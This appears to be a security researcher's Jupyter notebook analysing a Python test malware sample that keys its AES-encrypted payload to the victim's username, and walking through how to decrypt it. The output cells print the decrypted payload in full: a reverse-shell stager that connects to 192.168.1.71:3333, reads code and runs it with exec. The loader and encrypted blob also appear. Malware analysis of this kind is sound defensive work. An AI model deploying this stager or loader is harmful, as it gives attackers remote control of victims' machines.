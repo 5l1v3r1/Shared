{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Malware PoC with an environmental key\n",
    "### Author: @JohnLaTwC\n",
    "### Sample hash: 26876d11ec8296829bcce367356c448369fdcd280a67ee427a03052efca32dd5\n",
    "\n",
    "This notebook explores a Python test malware sample uploaded to VT that uses an environmental key. What is that?  It is when the payload is encrypted and the decryption key is not hardcoded in the malware and instead comes from looking up something in the victim environment.  This would make analysis difficult if security researchers don't have access to the victim environment.\n",
    "\n",
    "Reference:\n",
    "<li> https://www.virustotal.com/gui/file/26876d11ec8296829bcce367356c448369fdcd280a67ee427a03052efca32dd5/detection\n",
    "<li> https://www.virustotal.com/gui/file/4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2/detection\n",
    "<li> See also 'clueless agents' https://twitter.com/VessOnSecurity/status/898227226126278656"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "## First things first, run this cell to ensure you have the crypto libraries installed\n",
    "\n",
    "!pip install pycrypto"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# from 26876d11ec8296829bcce367356c448369fdcd280a67ee427a03052efca32dd5 (slightly neutered)\n",
    "import base64,sys,os,hashlib;\n",
    "from Crypto import Random;\n",
    "from Crypto.Cipher import AES;\n",
    "\n",
    "BLOCK_SIZE = 16\n",
    "pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)\n",
    "unpad = lambda s: s[:-ord(s[len(s) - 1:])]\t\n",
    "\n",
    "def encrypt(raw, password):\n",
    "    private_key = hashlib.sha256(password.encode(\"utf-8\")).digest()\n",
    "    raw = pad(raw)\n",
    "    iv = Random.new().read(AES.block_size)\n",
    "    cipher = AES.new(private_key, AES.MODE_CBC, iv)\n",
    "    return base64.b64encode(iv + cipher.encrypt(raw))\n",
    "\n",
    "def decrypt(enc, password):\n",
    "    private_key = hashlib.sha256(password.encode(\"utf-8\")).digest()\n",
    "    enc = base64.b64decode(enc)\n",
    "    iv = enc[:16]\n",
    "    cipher = AES.new(private_key, AES.MODE_CBC, iv)\n",
    "    return unpad(cipher.decrypt(enc[16:]))\n",
    "\n",
    "def decode(envkey):\n",
    "    if(hashlib.sha256(envkey.encode()).hexdigest() == '4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2'):\n",
    "        payload = decrypt(\"iFJQf3QoXOLy5BOHVCeu0yW/WOclm/4Mk9FYZfERa+seBfbLqUU/tyyXxUaJUyezRkPC76PURK7RLaJc1YI0lsodEPXgfIt4SCZ/GP85YZEpAQgsaBqMR0GiazoJKiIo2/gP5kAvJk5ur90Y5aDsdYRUIEk0yVPxq3w383ZHMeMcaPkdBMgAQjEKUucEvBcAeG1mCvIt1RxEBZWd7Qu+Vqk/RqKnkz9VIngbCN1BbWuDVGJITxigkODbXFjBX7g0ghW98ONtJbDLHkoBhwc01KCTsYddTUw+kmmbdnWMVaBGRm7bJKMWG2iLUMF7QsNpPmCOvSiyKJS+cxcyQKPlBWOzrzTNrUEIO8b/fFMQBIepqkVAW2F8+5j2VNF2L1iRnsGS7V/otchKJyhqE0OA+0r31nDmeJjrSvVyq4bTbMVw269haW3FQnX0gyk3axexgWDSRyd3Zq6XdLe7qg0VViUAkCz3fq6huqYmN6NTpeV43OKCPD5axjFDRe05Ro9AA8ra5MQbV9e83yaqgqWKTNrulLpA46gmYZZq7ODzCT4TnbM0G7A1xNiEBQ3pjGhr7PlcQzNXneykREjm0jdzrA==\",hashlib.sha256(envkey.encode()).hexdigest())\n",
    "        print(base64.b64decode(payload).decode())\n",
    "    else:\n",
    "        print('Environmental key is not matched. Decryption not attempted')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can see that decryption routine uses AES.MODE_CBC and a password. \n",
    "The encryption key is based on the value returned from os.login(). \n",
    "If your username does not match, the payload will not decrypt.\n",
    "The SHA 256 of the username must match `4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2`\n",
    "\n",
    "You can see the value derived from your username by modifying and running the cell below:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Your key derived is 96d9632f363564cc3032521409cf22a852f2032eec099ed5967c0d000cec607a\n"
     ]
    }
   ],
   "source": [
    "envkey =  'john'\n",
    "print(\"Your key derived is %s\" % hashlib.sha256(envkey.encode()).hexdigest())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Your next question may be: What username hashes to `4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2`? \n",
    "Well, one could try to brute force common user names. There is an easier way. Let's look up that hash value on VirusTotal.\n",
    "\n",
    "[4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2](https://www.virustotal.com/gui/file/4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2/content/hex)\n",
    "\n",
    "Turns out someone uploaded a file whose content hashes to our value. If you look at the content tab on VT, you see the content is the word `root`. Not a big surprise especially since this sample is a test proof-of-concept."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Your key derived from os.getlogin() is 4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2\n",
      "#test\n",
      "import socket,struct,time\n",
      "#ok coool\n",
      "for x in range(10):\n",
      "#bien\n",
      "\ttry:\n",
      "\t\ts=socket.socket(2,socket.SOCK_STREAM)\n",
      "\t\ts.connect(('192.168.1.71',3333))\n",
      "\t\tbreak\n",
      "\texcept:\n",
      "\t\ttime.sleep(5)\n",
      "#slt\n",
      "l=struct.unpack('>I',s.recv(4))[0]\n",
      "#cparti mdr\n",
      "d=s.recv(l)\n",
      "#aller\n",
      "while len(d)<l:\n",
      "\td+=s.recv(l-len(d))\n",
      "#ok\n",
      "exec(d,{'s':s})\n",
      "#end\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# let's decode the payload with the password `root`\n",
    "\n",
    "envkey =  'root'\n",
    "print(\"Your key derived from os.getlogin() is %s\" % hashlib.sha256(envkey.encode()).hexdigest())\n",
    "decode(envkey)\n",
    "\n",
    "# We see that it is a reverse shell. The IP is in the private address range which makes sense for a PoC."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Bonus\n",
    "\n",
    "There is an even easier way to decrypt the payload without knowing the username. Are you ready?\n",
    "\n",
    "It has to do with how the payload was created. The environmental key is not the username itself. It is the <b>hash of the username</b>.\n",
    "\n",
    "The code TELLS US the hash of the username in the `if` statement. So all we need to do is plug that in to the decryption routine!\n",
    "\n",
    "```\n",
    "    if(hashlib.sha256(envkey.encode()).hexdigest() == '4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2'):\n",
    "        payload = decrypt(\"...\",hashlib.sha256(envkey.encode()).hexdigest())\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#test\n",
      "import socket,struct,time\n",
      "#ok coool\n",
      "for x in range(10):\n",
      "#bien\n",
      "\ttry:\n",
      "\t\ts=socket.socket(2,socket.SOCK_STREAM)\n",
      "\t\ts.connect(('192.168.1.71',3333))\n",
      "\t\tbreak\n",
      "\texcept:\n",
      "\t\ttime.sleep(5)\n",
      "#slt\n",
      "l=struct.unpack('>I',s.recv(4))[0]\n",
      "#cparti mdr\n",
      "d=s.recv(l)\n",
      "#aller\n",
      "while len(d)<l:\n",
      "\td+=s.recv(l-len(d))\n",
      "#ok\n",
      "exec(d,{'s':s})\n",
      "#end\n",
      "\n"
     ]
    }
   ],
   "source": [
    "payload = decrypt(\"iFJQf3QoXOLy5BOHVCeu0yW/WOclm/4Mk9FYZfERa+seBfbLqUU/tyyXxUaJUyezRkPC76PURK7RLaJc1YI0lsodEPXgfIt4SCZ/GP85YZEpAQgsaBqMR0GiazoJKiIo2/gP5kAvJk5ur90Y5aDsdYRUIEk0yVPxq3w383ZHMeMcaPkdBMgAQjEKUucEvBcAeG1mCvIt1RxEBZWd7Qu+Vqk/RqKnkz9VIngbCN1BbWuDVGJITxigkODbXFjBX7g0ghW98ONtJbDLHkoBhwc01KCTsYddTUw+kmmbdnWMVaBGRm7bJKMWG2iLUMF7QsNpPmCOvSiyKJS+cxcyQKPlBWOzrzTNrUEIO8b/fFMQBIepqkVAW2F8+5j2VNF2L1iRnsGS7V/otchKJyhqE0OA+0r31nDmeJjrSvVyq4bTbMVw269haW3FQnX0gyk3axexgWDSRyd3Zq6XdLe7qg0VViUAkCz3fq6huqYmN6NTpeV43OKCPD5axjFDRe05Ro9AA8ra5MQbV9e83yaqgqWKTNrulLpA46gmYZZq7ODzCT4TnbM0G7A1xNiEBQ3pjGhr7PlcQzNXneykREjm0jdzrA==\",\n",
    "                  '4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2')\n",
    "print(base64.b64decode(payload).decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
